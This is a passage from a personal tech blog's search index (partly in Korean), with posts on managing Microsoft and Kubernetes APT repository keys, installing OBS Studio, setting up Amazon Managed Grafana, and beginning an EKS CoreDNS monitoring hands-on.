how APT package manager works.\nAnd, I summarized them as below.\nIf you have more idea about this, please let me know via comments. It will be helpful for newbie, me. :)\n(0) Add Microsoft GPG Key First, you need to add Microsoft GPG Key to your system.\nThere are neither CORRECT ANSWER nor INCORRECT ANSWER for this.\nAll is up to you.\n# Option 1 wget -qO- https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor \u0026gt; packages.microsoft.gpg sudo install -D -o root -g root -m 644 packages.microsoft.gpg /etc/apt/keyrings/packages.microsoft.gpg # Option 2 curl https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor \u0026gt; microsoft.gpg sudo mv microsoft.gpg /etc/apt/trusted.gpg.d/microsoft.gpg (1) Add Microsoft Repository to get Package metadata At first, you need to add Microsoft Repository to your system.\nSo, APT package manager can find Microsoft packages.\n# Microsoft Edge echo \u0026#34;deb [arch=amd64] https://packages.microsoft.com/repos/edge stable main\u0026#34; | sudo tee /etc/apt/sources.list.d/microsoft-edge.list # Visual Studio Code echo \u0026#34;deb [arch=amd64] https://packages.microsoft.com/repos/vscode stable main\u0026#34; | sudo tee /etc/apt/sources.list.d/vscode.list There are also neither CORRECT ANSWER nor INCORRECT ANSWER for this. Alternative naming for microsft-edge.list and vscode.list are up to you.\ne.g.) Below also works for Visual Studio Code. sudo sh -c \u0026#39;echo \u0026#34;deb [arch=amd64 signed-by=/etc/apt/keyrings/packages.microsoft.gpg] https://packages.microsoft.com/repos/code stable main\u0026#34; \u0026gt; /etc/apt/sources.list.d/vscode.list\u0026#39; (2) Decryption metadata with Microsoft GPG Key APT package manager already hits Microsoft Repository to get metadata.\ne.g.) https://packages.microsoft.com/repos/\u0026lt;package-name\u0026gt; stable InRelease\nSo, APT package manager decrypts metadata with Microsoft GPG Key.\nIf you don\u0026rsquo;t have Microsoft GPG Key, you will get errors.\n(3) Install Microsoft DEB packages Finally, APT package manager installs Microsoft DEB packages on your behalf!\nDescriptions Microsoft\u0026rsquo;s GPG public key You could verify the Microsoft GPG public key.\nSee, How to use the GPG Repository Signing Key\nHow Microsoft signs the packages with GPG public key You have Microsoft GPG public key to verify the packages in installation.\n(\u0026hellip;) in deb-based distributions it is common to sign the repository metadata but not the individual debs. Microsoft signs both the individual packages and the repository metadata for both types of distributions. (\u0026hellip;)\nSee, Signature Verification\nHow looks like InRelease file -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA256 Origin: code stable Label: code stable Suite: stable Codename: stable Date: Fri, 28 Feb 2025 12:18:34 +0000 Architectures: amd64 arm64 armhf all Components: main Description: Generated by aptly Acquire-By-Hash: yes SHA256: (...) SHA512: (...) -----BEGIN PGP SIGNATURE----- Version: BSN Pgp v1.0.0.0 (...) -----END PGP SIGNATURE----- My Screenshots When I upgrade my system from 22.04 LTS Jammy to 23.10 Mantic, APT sources are disabled. My GPG public keyrings for update/upgrade My sources.list.d and APT package manager hits Microsoft Repositories properly. I\u0026rsquo;ll remove vscode.list.distUpgrade and vscode.sources files.\nReferences https://packages.microsoft.com/ Microsoft Learn/Microsoft Linux Repositories GitHub/Microsoft Linux Repositories phoenixNAP/How to Install Visual Studio Code on Ubuntu ","date":"2025-03-02T22:31:49+09:00","permalink":"https://blog.minseong.xyz/post/how-to-manage-microsoft-packages-with-apt-manager/","section":"post","tags":["debian","ubuntu","apt","microsoft","edge","vscode"],"title":"How to manage Microsoft packages with APT manager"},{"categories":null,"contents":"뭔가 내가 알려줘야하는데, 글로 쓰기 싫은 그런 날이 있다.\n그래서 있는 OBS Studio.\nUbuntu도 22.04 LTS (Jammy Jellyfish) 이후부터는 OBS Studio를 APT repository를 통해 설치를 할 수 있다고 하여, 도전.\nInstallation: https://obsproject.com/download sudo add-apt-repository ppa:obsproject/obs-studio sudo apt update sudo apt install ffmpeg obs-studio 생각보다 오래 걸린다.\nsudo add-apt-repository ppa:obsproject/obs-studio # [sudo] password for kkumtree: # Repository: \u0026#39;Types: deb # URIs: https://ppa.launchpadcontent.net/obsproject/obs-studio/ubuntu/ # Suites: noble # Components: main # \u0026#39; # Description: # Latest stable release of OBS Studio # More info: https://launchpad.net/~obsproject/+archive/ubuntu/obs-studio # Adding repository. # Press [ENTER] to continue or Ctrl-c to cancel. # Hit:1 https://packages.microsoft.com/repos/edge stable InRelease # Hit:3 https://baltocdn.com/helm/stable/debian all InRelease # Hit:2 https://prod-cdn.packages.k8s.io/repositories/isv:/kubernetes:/core:/stable:/v1.31/deb InRelease # Hit:4 http://security.ubuntu.com/ubuntu noble-security InRelease # Hit:5 https://ppa.launchpadcontent.net/graphics-drivers/ppa/ubuntu noble InRelease # Hit:6 https://esm.ubuntu.com/apps/ubuntu noble-apps-security InRelease # Hit:7 https://esm.ubuntu.com/apps/ubuntu noble-apps-updates InRelease # Hit:8 https://esm.ubuntu.com/infra/ubuntu noble-infra-security InRelease # Get:9 https://ppa.launchpadcontent.net/obsproject/obs-studio/ubuntu noble InRelease [17.8 kB] # Hit:10 https://esm.ubuntu.com/infra/ubuntu noble-infra-updates InRelease # Get:11 https://ppa.launchpadcontent.net/obsproject/obs-studio/ubuntu noble/main amd64 Packages [1,168 B] # Get:12 https://ppa.launchpadcontent.net/obsproject/obs-studio/ubuntu noble/main Translation-en [160 B] # Hit:13 http://kr.archive.ubuntu.com/ubuntu noble InRelease # Hit:14 http://kr.archive.ubuntu.com/ubuntu noble-updates InRelease # Hit:15 http://kr.archive.ubuntu.com/ubuntu noble-backports InRelease # Fetched 19.1 kB in 3s (6,126 B/s) # Reading package lists... Done 이미 업데이트가 된 느낌이긴 한데, 한번 더 하라니까 합니다.\nsudo apt-get update # Hit:1 https://packages.microsoft.com/repos/edge stable InRelease # Hit:3 http://kr.archive.ubuntu.com/ubuntu noble InRelease # Hit:4 http://security.ubuntu.com/ubuntu noble-security InRelease # Hit:2 https://prod-cdn.packages.k8s.io/repositories/isv:/kubernetes:/core:/stable:/v1.31/deb InRelease # Hit:5 https://baltocdn.com/helm/stable/debian all InRelease # Hit:6 http://kr.archive.ubuntu.com/ubuntu noble-updates InRelease # Hit:7 http://kr.archive.ubuntu.com/ubuntu noble-backports InRelease # Hit:8 https://ppa.launchpadcontent.net/graphics-drivers/ppa/ubuntu noble InRelease # Hit:9 https://esm.ubuntu.com/apps/ubuntu noble-apps-security InRelease # Hit:10 https://ppa.launchpadcontent.net/obsproject/obs-studio/ubuntu noble InRelease # Hit:11 https://esm.ubuntu.com/apps/ubuntu noble-apps-updates InRelease # Hit:12 https://esm.ubuntu.com/infra/ubuntu noble-infra-security InRelease # Hit:13 https://esm.ubuntu.com/infra/ubuntu noble-infra-updates InRelease # Reading package lists... Done 여기서 다운로드에 지연이 발생\nsudo apt-get install ffmpeg obs-studio # Reading package lists... Done # Building dependency tree... Done # Reading state information... Done # ffmpeg is already the newest version (7:6.1.1-3ubuntu5+esm2). # ffmpeg set to manually installed. # The following additional packages will be installed: # libfdk-aac2 libmbedtls14t64 libmbedx509-1t64 libqrcodegencpp1 libqt6xml6t64 # libsrt1.5-openssl libxcb-composite0 # The following NEW packages will be installed: # libfdk-aac2 libmbedtls14t64 libmbedx509-1t64 libqrcodegencpp1 libqt6xml6t64 # libsrt1.5-openssl libxcb-composite0 obs-studio # 0 upgraded, 8 newly installed, 0 to remove and 14 not upgraded. # Need to get 91.1 MB of archives. # After this operation, 299 MB of additional disk space will be used. # Do you want to continue? [Y/n] Y # Get:1 http://kr.archive.ubuntu.com/ubuntu noble/universe amd64 libfdk-aac2 amd64 2.0.2-3~ubuntu4 [332 kB] # Get:2 https://ppa.launchpadcontent.net/obsproject/obs-studio/ubuntu noble/main amd64 obs-studio amd64 30.2.3-0obsproject1~noble [90.2 MB] # Get:3 http://kr.archive.ubuntu.com/ubuntu noble/universe amd64 libmbedx509-1t64 amd64 2.28.8-1 [46.6 kB] # Get:4 http://kr.archive.ubuntu.com/ubuntu noble/universe amd64 libmbedtls14t64 amd64 2.28.8-1 [82.2 kB] # Get:5 http://kr.archive.ubuntu.com/ubuntu noble/universe amd64 libqrcodegencpp1 amd64 1.8.0-1.2build1 [27.6 kB] # Get:6 http://kr.archive.ubuntu.com/ubuntu noble/universe amd64 libqt6xml6t64 amd64 6.4.2+dfsg-21.1build5 [75.9 kB] # Get:7 http://kr.archive.ubuntu.com/ubuntu noble/universe amd64 libsrt1.5-openssl amd64 1.5.3-1build2 [318 kB] # Get:8 http://kr.archive.ubuntu.com/ubuntu noble/main amd64 libxcb-composite0 amd64 1.15-1ubuntu2 [5,304 B] # Fetched 91.1 MB in 6min 18s (241 kB/s) # Selecting previously unselected package libfdk-aac2:amd64. # (Reading database ... 272530 files and directories currently installed.) # Preparing to unpack .../0-libfdk-aac2_2.0.2-3~ubuntu4_amd64.deb ... # Unpacking libfdk-aac2:amd64 (2.0.2-3~ubuntu4) ... # Selecting previously unselected package libmbedx509-1t64:amd64. # Preparing to unpack .../1-libmbedx509-1t64_2.28.8-1_amd64.deb ... # Unpacking libmbedx509-1t64:amd64 (2.28.8-1) ... # Selecting previously unselected package libmbedtls14t64:amd64. # Preparing to unpack .../2-libmbedtls14t64_2.28.8-1_amd64.deb ... # Unpacking libmbedtls14t64:amd64 (2.28.8-1) ... # Selecting previously unselected package libqrcodegencpp1:amd64. # Preparing to unpack .../3-libqrcodegencpp1_1.8.0-1.2build1_amd64.deb ... # Unpacking libqrcodegencpp1:amd64 (1.8.0-1.2build1) ... # Selecting previously unselected package libqt6xml6t64:amd64. # Preparing to unpack .../4-libqt6xml6t64_6.4.2+dfsg-21.1build5_amd64.deb ... # Unpacking libqt6xml6t64:amd64 (6.4.2+dfsg-21.1build5) ... # Selecting previously unselected package libsrt1.5-openssl:amd64. # Preparing to unpack .../5-libsrt1.5-openssl_1.5.3-1build2_amd64.deb ... # Unpacking libsrt1.5-openssl:amd64 (1.5.3-1build2) ... # Selecting previously unselected package libxcb-composite0:amd64. # Preparing to unpack .../6-libxcb-composite0_1.15-1ubuntu2_amd64.deb ... # Unpacking libxcb-composite0:amd64 (1.15-1ubuntu2) ... # Selecting previously unselected package obs-studio. # Preparing to unpack .../7-obs-studio_30.2.3-0obsproject1~noble_amd64.deb ... # Unpacking obs-studio (30.2.3-0obsproject1~noble) ... # Setting up libfdk-aac2:amd64 (2.0.2-3~ubuntu4) ... # Setting up libqrcodegencpp1:amd64 (1.8.0-1.2build1) ... # Setting up libmbedx509-1t64:amd64 (2.28.8-1) ... # Setting up libqt6xml6t64:amd64 (6.4.2+dfsg-21.1build5) ... # Setting up libsrt1.5-openssl:amd64 (1.5.3-1build2) ... # Setting up libxcb-composite0:amd64 (1.15-1ubuntu2) ... # Setting up libmbedtls14t64:amd64 (2.28.8-1) ... # Setting up obs-studio (30.2.3-0obsproject1~noble) ... # Processing triggers for desktop-file-utils (0.27-2build1) ... # Processing triggers for hicolor-icon-theme (0.17-2) ... # Processing triggers for gnome-menus (3.36.0-1.1ubuntu3) ... # Processing triggers for libc-bin (2.39-0ubuntu8.3) ... # Processing triggers for mailcap (3.70+nmu1ubuntu1) ... 일단 돌아는 간다. 캡처만 딸꺼라 상관없을 듯 합니다.\n","date":"2024-11-11T20:59:03+09:00","permalink":"https://blog.minseong.xyz/post/install-obs-studio-ubuntu/","section":"post","tags":["obs","utility"],"title":"Ubuntu에 OBS Studio 설치하기"},{"categories":null,"contents":" 매번 수정하기 귀찮아서, 나중에 찾아서 쓰려고 끄적이는 메모\n보통 GPG키 지우고 다시 받으면 된다.\n그런 날이 있다. 무심결에 sudo apt-get update를 실행하는 순간, 에러가 뜨는 날.\nW: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: https://prod-cdn.packages.k8s.io/repositories/isv:/kubernetes:/core:/stable:/v1.31/deb InRelease: The following signatures were invalid: EXPKEYSIG 234654DA9A296436 isv:kubernetes OBS Project \u0026lt;isv:kubernetes@build.opensuse.org\u0026gt; W: Failed to fetch https://pkgs.k8s.io/core:/stable:/v1.31/deb/InRelease The following signatures were invalid: EXPKEYSIG 234654DA9A296436 isv:kubernetes OBS Project \u0026lt;isv:kubernetes@build.opensuse.org\u0026gt; W: Some index files failed to download. They have been ignored, or old ones used instead. Zorin OS로 처음 입문할 때는 이거 마주치면 버티다 버티다 포맷했는데, 이제는 뭐\u0026hellip; 어디서 키 만료됐나보다 하고 그려려니 한다. =ㅅ=);\n아래 명령어를 치면, 이번 케이스는 keyrings 디렉토리와 sources.list.d 디렉토리만 살펴보면 끝난다.\ntree /etc/apt/ -L 1 # /etc/apt/ # ├── apt.conf.d # ├── auth.conf.d # ├── keyrings # ├── preferences.d # ├── sources.list # ├── sources.list.d # ├── sources.list.distUpgrade # ├── trusted.gpg.d # └── trusted.gpg~ # 7 directories, 3 files 그저 오류가 난 파일을 열어, GPG Key의 위치를 확인하고 해당 패키지를 설치한 기억을 되새기면 된다.\nls /etc/apt/sources.list.d # docker.list.distUpgrade kubernetes.list ubuntu-esm-infra.sources # gns3-ubuntu-ppa-lunar.list.distUpgrade microsoft-edge.list ubuntu.sources # gns3-ubuntu-ppa-lunar.sources microsoft-prod.list.distUpgrade vscode.list.distUpgrade # graphics-drivers-ubuntu-ppa-kinetic.list.distUpgrade microsoft-prod.sources vscode.sources # graphics-drivers-ubuntu-ppa-kinetic.sources tailscale.list.distUpgrade yarn.list.distUpgrade # graphics-drivers-ubuntu-ppa-noble.sources third-party.sources yarn.sources # helm-stable-debian.list ubuntu-esm-apps.sources cat /etc/apt/sources.list.d/kubernetes.list # deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.gpg] https://pkgs.k8s.io/core:/stable:/v1.31/deb/ / 그랬지. kubectl 쓰겠다고 설치했었구나.\nInstall using native package management/kubenetes 슥삭 지운다.\nsudo rm /etc/apt/keyrings/kubernetes-apt-keyring.gpg 설치 가이드대로 얌전히 다시 키 받아서 dearmor하고, 경로에 두자.\ncurl -fsSL https://pkgs.k8s.io/core:/stable:/v1.31/deb/Release.key | sudo gpg --dearmor -o /etc/apt/keyrings/kubernetes-apt-keyring.gpg sudo chmod 644 /etc/apt/keyrings/kubernetes-apt-keyring.gpg # allow unprivileged APT programs to read this keyring 그저 잘된다.\nsudo apt-get update # Hit:1 https://packages.microsoft.com/repos/edge stable InRelease # Hit:3 http://security.ubuntu.com/ubuntu noble-security InRelease # Hit:4 http://kr.archive.ubuntu.com/ubuntu noble InRelease # Hit:5 https://baltocdn.com/helm/stable/debian all InRelease # Hit:2 https://prod-cdn.packages.k8s.io/repositories/isv:/kubernetes:/core:/stable:/v1.31/deb InRelease # Hit:6 http://kr.archive.ubuntu.com/ubuntu noble-updates InRelease # Hit:7 https://esm.ubuntu.com/apps/ubuntu noble-apps-security InRelease # Hit:8 http://kr.archive.ubuntu.com/ubuntu noble-backports InRelease # Hit:9 https://ppa.launchpadcontent.net/graphics-drivers/ppa/ubuntu noble InRelease # Hit:10 https://esm.ubuntu.com/apps/ubuntu noble-apps-updates InRelease # Hit:11 https://esm.ubuntu.com/infra/ubuntu noble-infra-security InRelease # Hit:12 https://esm.ubuntu.com/infra/ubuntu noble-infra-updates InRelease # Reading package lists... Done sudo apt-get upgrade # Reading package lists... Done # Building dependency tree... Done # Reading state information... Done # Calculating upgrade... Done # The following upgrades have been deferred due to phasing: # file-roller python3-distupgrade shotwell shotwell-common ubuntu-release-upgrader-core ubuntu-release-upgrader-gtk # 0 upgraded, 0 newly installed, 0 to remove and 6 not upgraded. 그리고 딱히 업그레이드해야할 것도 없었다.\n\u0026hellip;\n아마, 예전 글에 sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 234654DA9A296436 써도 된다고 있는데,\n이건 deprecated 방식이라 좀 꺼려진다.\n물론 설치 안내문에 있는 내용도 아니고, 키가 또 따로 놀게된다.\nsudo apt-key list # Warning: apt-key is deprecated. Manage keyring files in trusted.gpg.d instead (see apt-key(8)). # /etc/apt/trusted.gpg # -------------------- # pub rsa2048 2022-08-25 [SC] [expires: 2026-12-29] # DE15 B144 86CD 377B 9E87 6E1A 2346 54DA 9A29 6436 # uid [ unknown] isv:kubernetes OBS Project \u0026lt;isv:kubernetes@build.opensuse.org\u0026gt; 안그래도 지금 Authentication 정리를 미뤄서 잔뜩 쌓였는데, 아래 메뉴로 진입해서 지웠다.\n내 GUI기준으로는 Software \u0026amp; Updates 이다.\n어차피 해당 파일이 날아갔어도, 직전의 이력은 /etc/apt/trusted.gpg\\~ 에 남아있다.\n","date":"2024-11-04T21:24:49+09:00","permalink":"https://blog.minseong.xyz/post/apt-expkeysig-troubleshooting/","section":"post","tags":["debian","ubuntu","apt","expkeysig"],"title":"The following signatures were invalid: EXPKEYSIG"},{"categories":null,"contents":" Organization의 이슈가 있어 Amazon Managed Grafana Workspace를 사용하려면 SAML 인증을 구성해야하는데, SAML 인증 제어가 되면 검토해보겠습니다.\n당연히 거의 4년이 다되가니 Amazon Managed Grafana – Getting Started와는 다른 인터페이스를 확인할 수 있었습니다.\n현재 제 권한으로는 Organization을 생성할 수 없어서, Workspace만 생성해보았습니다.\n즉, 매우 느슨한 권한으로 Workspace를 만들어주겠다 이것입니다.\n1. \u0026lsquo;딸깍\u0026rsquo;으로 시작하기 Getting Started with 딸깍 이름만 짓고, 넘어가 보겠습니다. AWS IIC IAM Identity Center (구, AWS SSO)를 활용하겠습니다. 신경써야할게 많네요 딸~깍, 유저를 만들어봅시다. YEO-EUK-SHI\u0026hellip; 될리가 없지요. IAM Identity Center 활성화부터 해야겠네요. 2. IAM Identity Center 활성화 시도 보통, 이때 조금 망했다는 생각이 들기 시작하죠\nIAM Identity Center 메뉴에서 Enable을 딸깍 합니다. Recommended 싫은데요! 난 다른거 할 건데요! 하면 경고 엄청 날립니다. - Users, groups, and AWS managed applications are isolated to this account instance. - 선택지 그대로, 현재 로그인한 계정에 격리된다고 합니다. - This account instance doesn\u0026#39;t support granting users and groups access to - AWS accounts in an AWS organization. - AWS Org.에 속한 계정에 권한 부여 안된다고 합니다. - This account instance can\u0026#39;t be upgraded to become an organization instance. - `Recommended` 선택지로 업그레이드 안된다고 합니다. 알았어, 알았다고. 왼쪽을 선택하고 Continue를 딸깍 아 맞다, 주인님 허가 맡아야하지\u0026hellip; 이미 경고 숙지했으니, 오른쪽 선택지로 Continue를 딸깍 한 5~10초 가량 소요 이제 뭘해야할까\u0026hellip; 이대로 되는 것일까\u0026hellip; 다시 시도! UpdateSsoConfiguration 권한 넣으라는 엄중한 지시\u0026hellip; 애당초, 안되는 것 같아보이는데\u0026hellip; 에라, Document 소환!\nDocs: Use AWS IAM Identity Center with your Amazon Managed Grafana workspace 아래 권한을 제게 다 넣어보겠습니다.\nAWSGrafanaAccountAdministrator AWSSSOMasterAccountAdministrator AWSOrganizationsFullAccess AWSSSODirectoryAdministrator 또 안되서, 인라인 하나만 넣어보고 안되면 던져야겠습니다. 아 그냥 안되는 거였네요. 일단 넘어가야겠네요. 3. SAML-based AMG SAML 인증으로 선택해보고 계속 생성시도 해보겠습니다. 다른 옵션은 아래와 같습니다. 경고가 아찔한데\u0026hellip; Docs: Amazon Managed Grafana permissions and policies for AWS data sources 에러는 없애지 못했지만, 워크스페이스 자체는 생성이 되었습니다. 찜찜 4. SAML 설정 SAML의 경우, 제가 Admin인 SAML이 없어서 나중에 검토해볼 생각입니다. ","date":"2024-11-02T21:43:00+09:00","permalink":"https://blog.minseong.xyz/post/getting-started-amazon-managed-grafana-workspace/","section":"post","tags":["aws","grafana"],"title":"SAML for using Amazon Managed Grafana Workspace (To-Do)"},{"categories":null,"contents":" Grafana Cloud 첫 사용기\nCloudNet@에서 진행하고 있는 K8s Advanced Network Study(이하, KANS)를 통해 학습한 내용을 정리합니다.\n이번 주차는 실감이 아직 안나는데, 스터디 마지막 주차입니다.\n그래서 여러분이 잘 알고, 매우 좋아하는 EKS를 통해, CoreDNS 이슈를 모니터링하는 Hands-on을 차근차근 따라해보려고합니다.\nAWS Cloud Operations Blog/Monitoring CoreDNS for DNS throttling issues using AWS Open source monitoring services 위의 Blog를 그대로 따라해볼 겁니다.\n0. EKS Cluster 생성 스터디에서 제공된 CloudFormation을 통해 EKS Cluster를 생성해볼까합니다.\neksctl이 언급되어 있어서 왠지\u0026hellip; 나중에 롤백하고 태초마을부터 eksctl 기반 CloudFormation 배포를 할 것 같은 불안함이 있지만 해보죠(?).\n음 아직은 기우였네요. 기억을 끄집어내보니 bation host에서 eksctl 을 사용해서 EKS Cluster 생성하는 것까지 스크립팅 되어 있다고, 말씀을 들었던 것 같습니다.\n생성된 bastion에 접속해서, 환경변수 등을 확인해보겠습니다.\nssh -i ~/.ssh/id_ed25519 ec2-user@43.201.85.169 # BASTION-HOST-IP # The authenticity of host \u0026#39;43.201.85.169 (43.201.85.169)\u0026#39; can\u0026#39;t be established. # ED25519 key fingerprint is SHA256:efFNF+24E7UUEzXzhqBDU0ss74yBmhGiaOI25XOVG9A. # This key is not known by any other names. # Are you sure you want to continue connecting (yes/no/[fingerprint])? yes # Warning: Permanently added \u0026#39;43.201.85.169\u0026#39; (ED25519) to the list of known hosts. # , #_ # ~\\_ ####_ Amazon Linux 2 # ~~ \\_#####\\ # ~~ \\###| AL2 End of Life is 2025-06-30. # ~~ \\#/ ___ # ~~ V~\u0026#39; \u0026#39;-\u0026gt; # ~~~ / A newer version of Amazon Linux is available! # ~~._. _/ # _/ _/ Amazon Linux 2023, GA and supported until 2028-03-15. # _/m/\u0026#39; https://aws.amazon.com/linux/amazon-linux-2023/ # 10 package(s) needed for security, out of 13 available # Run \u0026#34;sudo yum update\u0026#34; to apply all updates. # (cm112@myeks:N/A) [root@myeks-bastion ~]# clear tail -f /var/log/cloud-init-output.log \\ # 66 †php8.1 available [ =stable ] # 67 awscli1 available [ =stable ] # 68 †php8.2 available [ =stable ] # 69 dnsmasq available [ =stable ] # 70 unbound1.17 available [ =stable ] # 72 collectd-python3 available [ =stable ] # † Note on end-of-support. Use \u0026#39;info\u0026#39; subcommand. # Created symlink from /etc/systemd/system/multi-user.target.wants/docker.service to /usr/lib/systemd/system/docker.service. # cloudinit End! # Cloud-init v. 19.3-46.amzn2.0.2 finished at Sat, 02 Nov 2024 09:44:24 +0000. Datasource DataSourceEc2. Up 91.81 seconds ^C tail -f /root/create-eks.log \u0026#34;availabilityZones\u0026#34;: [ \u0026#34;ap-northeast-2c\u0026#34;, \u0026#34;ap-northeast-2b\u0026#34;, \u0026#34;ap-northeast-2a\u0026#34; ], \u0026#34;cloudWatch\u0026#34;: { \u0026#34;clusterLogging\u0026#34;: {} } } ^C kubectl ns default # Context \u0026#34;cm112@myeks.ap-northeast-2.eksctl.io\u0026#34; modified. # Active namespace is \u0026#34;default\u0026#34;. eksctl get cluster # NAME\tREGION\tEKSCTL CREATED # myeks\tap-northeast-2\tTrue # eksctl get nodegroup --cluster $CLUSTER_NAME # CLUSTER\tNODEGROUP\tSTATUS\tCREATED\tMIN SIZE\tMAX SIZEDESIRED CAPACITY\tINSTANCE TYPE\tIMAGE ID\tASG NAME\tTYPE # myeks\tng1\tACTIVE\t2024-11-02T09:55:58Z\t3\t3\t3t3.medium\tAL2_x86_64\teks-ng1-2cc97626-bf01-5bcc-d680-091e003bd586\tmanaged export | egrep \u0026#39;ACCOUNT|AWS_|CLUSTER|KUBERNETES|VPC|Subnet\u0026#39; | egrep -v \u0026#39;SECRET|KEY\u0026#39; # declare -x ACCOUNT_ID=\u0026#34;\u0026lt;ACCOUNT-ID\u0026gt;\u0026#34; # declare -x AWS_DEFAULT_REGION=\u0026#34;ap-northeast-2\u0026#34; # declare -x AWS_PAGER=\u0026#34;\u0026#34; # declare -x AWS_REGION=\u0026#34;ap-northeast-2\u0026#34; # declare -x CLUSTER_NAME=\u0026#34;myeks\u0026#34; # declare -x KUBERNETES_VERSION=\u0026#34;1.30\u0026#34; # declare -x PrivateSubnet1=\u0026#34;subnet-044cf8b34576820ea\u0026#34; # declare -x PrivateSubnet2=\u0026#34;subnet-0ac2f3cd52e1ae640\u0026#34; # declare -x PrivateSubnet3=\u0026#34;subnet-0e5b144c0039c348b\u0026#34; # declare -x PubSubnet1=\u0026#34;subnet-0fef215562a97f319\u0026#34; # declare -x PubSubnet2=\u0026#34;subnet-0ca12b8db356bd486\u0026#34; # declare -x PubSubnet3=\u0026#34;subnet-01628d89d7c34590b\u0026#34; # declare -x VPCID=\u0026#34;vpc-0bcfa9363c4ff0069\u0026#34; kubectl get node --label-columns=node.kubernetes.io/instance-type,eks.amazonaws.com/capacityType,topology.kubernetes.io/zone # NAME STATUS ROLES AGE VERSION INSTANCE-TYPE CAPACITYTYPE ZONE # ip-192-168-1-219.ap-northeast-2.compute.internal Ready \u0026lt;none\u0026gt; 12m v1.30.4-eks-a737599 t3.medium ON_DEMAND ap-northeast-2a # ip-192-168-2-198.ap-northeast-2.compute.internal Ready \u0026lt;none\u0026gt; 12m v1.30.4-eks-a737599 t3.medium ON_DEMAND ap-northeast-2b # ip-192-168-3-85.ap-northeast-2.compute.internal Ready \u0026lt;none\u0026gt; 12m v1.30.4-eks-a737599 t3.medium ON_DEMAND ap-northeast-2c eksctl get iamidentitymapping --cluster myeks # ARN\tUSERNAME\tGROUPS\tACCOUNT # arn:aws:iam::\u0026lt;ACCOUNT-ID\u0026gt;:role/eksctl-myeks-nodegroup-ng1-NodeInstanceRole-bU6W7Cr0ugY5\tsystem:node:{{EC2PrivateDNSName}}\tsystem:bootstrappers,system:nodes\teksctl get iamidentitymapping --cluster myeks # ARN\tUSERNAME\tGROUPS\tACCOUNT # arn:aws:iam::\u0026lt;ACCOUNT-ID\u0026gt;:role/eksctl-myeks-nodegroup-ng1-NodeInstanceRole-bU6W7Cr0ugY5\tsystem:node:{{EC2PrivateDNSName}}\tsystem:bootstrappers,system:nodes 1. Hands-on을 위한 환경 구성 이제는 Hands-on에서 Pre-requisite로 요구하는 환경변수를 추가로 구성해보겠습니다.\nexport EKS_CLUSTER_NAME=$(echo $CLUSTER_NAME) export SERVICE=prometheusservice export ACK_SYSTEM_NAMESPACE=ack-system # export RELEASE_NAME=`curl -sL https://api.github.com/repos/aws-controllers-k8s/$SERVICE-controller/releases/latest | grep \u0026#39;\u0026#34;tag_name\u0026#34;:\u0026#39; | cut -d\u0026#39;\u0026#34;\u0026#39; -f4` 여기서 오래된 포스팅의 이슈를 발견하게 되는데,\nGitHub REST API가 더 안전해졌기 때문에, REALASE_NAME 가져오는 것이 불가능에 가까워졌습니다!\ncurl -sL https://api.github.com/repos/aws-controllers-k8s/$SERVICE-controller/releases/latest # { # \u0026#34;message\u0026#34;: \u0026#34;Not Found\u0026#34;, # \u0026#34;documentation_url\u0026#34;: \u0026#34;https://docs.github.com/rest/releases/releases#get-the-latest-release\u0026#34;, # \u0026#34;status\u0026#34;: \u0026#34;404\u0026#34; # } 배트맨! 초능력도 없는 우린 뭘 할 수 있죠?\n보통이면 레포를 당겨와서, git tag를 통해 확인하는게 맞는데, 핸즈온이니 링크를 열어서 최신 태그를 참고하시기 바랍니다.\naws-controllers-k8s/ prometheusservice-controller@GitHub 저도 번거로워서 302 Found 처리하여 태그 받아왔습니다.\ncurl -sS -I -G https://github.com/aws-controllers-k8s/$SERVICE-controller/releases/latest | grep -i location | awk -F\u0026#39;/\u0026#39; \u0026#39;{print $NF}\u0026#39; # v1.2.15 export RELEASE_NAME=$(curl -sS -I -G https://github.com/aws-controllers-k8s/$SERVICE-controller/releases/latest | grep -i location | awk -F\u0026#39;/\u0026#39; \u0026#39;{print $NF}\u0026#39;) echo $RELEASE_NAME # v1.2.15 2. Hands-On 무작정 따라하기 (a) Amazon Managed Prometheus Workspace 생성 aws amp create-workspace --alias blog-workspace --region $AWS_REGION # { # \u0026#34;arn\u0026#34;: \u0026#34;arn:aws:aps:ap-northeast-2:\u0026lt;ACCOUNT-ID\u0026gt;:workspace/ws-0d032a51-2b98-43b1-90cb-f5069329f1af\u0026#34;, # \u0026#34;status\u0026#34;: { # \u0026#34;statusCode\u0026#34;: \u0026#34;CREATING\u0026#34; # }, # \u0026#34;tags\u0026#34;: {}, # \u0026#34;workspaceId\u0026#34;: \u0026#34;ws-0d032a51-2b98-43b1-90cb-f5069329f1af\u0026#34; # } (b) Prometheus ethtool exporter 배포 안내된대로 exporter를 배포문을 작성해보겠습니다. cat \u0026lt;\u0026lt; EOF \u0026gt; ethtool-exporter.yaml --- apiVersion: apps/v1 kind: DaemonSet metadata: name: ethtool-exporter labels: app: ethtool-exporter spec: updateStrategy: rollingUpdate: maxUnavailable: 100% selector: matchLabels: app: ethtool-exporter template: metadata: annotations: prometheus.io/scrape: \u0026#39;true\u0026#39; prometheus.io/port: \u0026#39;9417\u0026#39; labels: app: ethtool-exporter spec: hostNetwork: true terminationGracePeriodSeconds: 0 containers: - name: ethtool-exporter env: - name: IP valueFrom: fieldRef: fieldPath: status.podIP image: drdivano/ethtool-exporter@sha256:39e0916b16de07f62c2becb917c94cbb3a6e124a577e1325505e4d0cdd550d7b command: - \u0026#34;sh\u0026#34; - \u0026#34;-exc\u0026#34; - \u0026#34;python3 /ethtool-exporter.py -l \\$(IP):9417 -I \u0026#39;(eth|em|eno|ens|enp)[0-9s]+\u0026#39;\u0026#34; ports: - containerPort: 9417 hostPort: 9417 name: http resources: limits: cpu: 250m memory: 100Mi requests: cpu: 10m memory: 50Mi tolerations: - effect: NoSchedule key: node-role.kubernetes.io/master --- apiVersion: v1 kind: Service metadata: labels: app: ethtool-exporter name: ethtool-exporter spec: clusterIP: None ports: - name: http port: 9417 selector: app: ethtool-exporter EOF kubectl apply -f ethtool-exporter.yaml 단순 exporter니까 배포는 잘 된 것 같습니다.\nkubectl get pods,svc -owide # NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES # pod/ethtool-exporter-b62vt 1/1 Running 0 51s 